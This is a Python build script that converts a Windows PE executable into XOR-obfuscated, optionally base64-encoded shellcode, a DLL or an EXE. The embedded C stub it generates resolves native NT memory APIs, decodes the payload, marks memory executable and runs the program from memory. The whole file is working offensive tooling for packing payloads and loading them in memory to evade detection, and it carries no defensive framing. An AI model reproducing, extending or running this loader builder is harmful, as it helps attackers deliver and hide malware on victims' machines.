import os
import sys
import subprocess
import textwrap
import base64
import random

if len(sys.argv) < 3:
    script_name = os.path.basename(sys.argv[0])
    print(f"Usage: {script_name} <input_pe> <output.bin> [-exe|-dll] [-xor] [-l <key_length>] [-k <key>] [-base64]")
    sys.exit(1)

args = [arg.lower() for arg in sys.argv]

input_pe = sys.argv[1]
output_bin = sys.argv[2]
use_exe = "-exe" in args
use_dll = "-dll" in args
use_b64 = "-base64" in args or "-b64" in args

use_xor = "-xor" in args or "-l" in args or "-k" in args

key_length = 1
key = [random.randint(1, 255) for _ in range(key_length)]

if "-l" in args:
    l_index = args.index("-l")
    key_length = int(sys.argv[l_index + 1], 0)
    if key_length not in (1, 2):
        print("Error: key length must be 1 or 2 bytes")
        sys.exit(1)
    key = [random.randint(1, 255) for _ in range(key_length)]

if "-k" in args:
    k_value = sys.argv[sys.argv.index("-k") + 1]

    if "," in k_value:
        key = [int(b, 0) for b in k_value.split(",")]
    elif k_value.startswith("0x") and len(k_value) > 2:
        hex_str = k_value[2:]
        if len(hex_str) % 2 != 0:
            hex_str = "0" + hex_str
        key = [int(hex_str[i:i+2], 16) for i in range(0, len(hex_str), 2)]
    else:
        key = [int(k_value, 0)]

    if len(key) not in (1, 2):
        print("Error: key length must be 1 or 2 bytes")
        sys.exit(1)

    key_length = len(key)

with open(input_pe, "rb") as f:
    pe_bytes = f.read()

if len(pe_bytes) < 2 or pe_bytes[:2] != b"MZ":
    print("[-] Input is not a valid PE (missing MZ header)")
    sys.exit(1)

data_bytes = pe_bytes
if use_xor:
    data_bytes = bytes(pe_bytes[i] ^ key[i % key_length] for i in range(len(pe_bytes)))

hex_array = ", ".join(f"0x{b:02x}" for b in data_bytes)

if use_xor:
    key_literal = ", ".join(f"0x{b:02x}" for b in key)
    c_source = textwrap.dedent(f"""
    #include "pe_loader.h"

    typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
        HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

    typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
        HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

    __attribute__((section(".text")))
    unsigned char pe_blob[] = {{
        {hex_array}
    }};

    __attribute__((section(".text")))
    unsigned char xor_key[{key_length}] = {{{key_literal}}};

    __attribute__((section(".text.start")))
    void _start(void) {{
        HMODULE hNtdll = myLoadLibraryA(ntdll_dll);

        NtAllocateVirtualMemory_t pNtAllocateVirtualMemory =
            (NtAllocateVirtualMemory_t)myGetProcAddress(hNtdll, ntallocatevirtualmemory);

        NtProtectVirtualMemory_t pNtProtectVirtualMemory =
            (NtProtectVirtualMemory_t)myGetProcAddress(hNtdll, ntprotectvirtualmemory);

        PVOID pe = NULL;
        SIZE_T size = sizeof(pe_blob);

        pNtAllocateVirtualMemory(
            (HANDLE)-1, &pe, 0, &size,
            MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

        unsigned char *buf = (unsigned char*)pe;

        for (SIZE_T i = 0; i < sizeof(pe_blob); i++)
            buf[i] = pe_blob[i] ^ xor_key[i % {key_length}];

        ULONG oldProt;
        pNtProtectVirtualMemory(
            (HANDLE)-1, &pe, &size,
            PAGE_EXECUTE_READ, &oldProt);

        ExecuteFromMemory(pe);
    }}
    """)
else:
    c_source = textwrap.dedent(f"""
    #include "pe_loader.h"

    __attribute__((section(".text")))
    unsigned char pe_blob[] = {{
        {hex_array}
    }};

    __attribute__((section(".text.start")))
    void _start(void) {{
        ExecuteFromMemory(pe_blob);
    }}
    """)

output_file = output_bin if use_exe or use_dll else "temp_compile.exe"

compile_cmd = [
    "x86_64-w64-mingw32-gcc",
    "-x", "c", "-",
    "-nostdlib", "-nostartfiles", "-ffreestanding",
    "-Wl,-subsystem,windows", "-e", "_start",
    "-Os", "-s",
    "-fno-ident",
    "-fno-asynchronous-unwind-tables",
    "-mno-stack-arg-probe",
    "-o", output_file
]

if use_dll:
    compile_cmd.extend(["-shared", "-Wl,--exclude-all-symbols"])

if not use_exe and not use_dll:
    compile_cmd.extend(["-T", "linker.ld"])

try:
    subprocess.run(
        compile_cmd,
        input=c_source.encode(),
        check=True
    )

    suffix = f" (XOR key: {','.join(f'0x{b:02X}' for b in key)})" if use_xor else ""

    if not use_exe and not use_dll:
        subprocess.run(
            ["objcopy", "-O", "binary", "--only-section=.text", output_file, output_bin],
            check=True
        )
        os.remove(output_file)

        if use_b64:
            with open(output_bin, "rb") as f:
                b = f.read()
            with open(output_bin, "w") as f:
                f.write(base64.b64encode(b).decode())
            print(f"[+] Base64 shellcode generated: {output_bin}{suffix}")
        else:
            print(f"[+] Shellcode generated: {output_bin}{suffix}")

    elif use_dll:
        if use_b64:
            with open(output_file, "rb") as f:
                b = f.read()
            with open(output_file, "w") as f:
                f.write(base64.b64encode(b).decode())
            print(f"[+] Base64 DLL generated: {output_file}{suffix}")
        else:
            print(f"[+] DLL generated: {output_file}{suffix}")

    else:
        if use_b64:
            with open(output_file, "rb") as f:
                b = f.read()
            with open(output_file, "w") as f:
                f.write(base64.b64encode(b).decode())
            print(f"[+] Base64 executable generated: {output_file}{suffix}")
        else:
            print(f"[+] Executable generated: {output_file}{suffix}")

except subprocess.CalledProcessError:
    sys.exit(1)
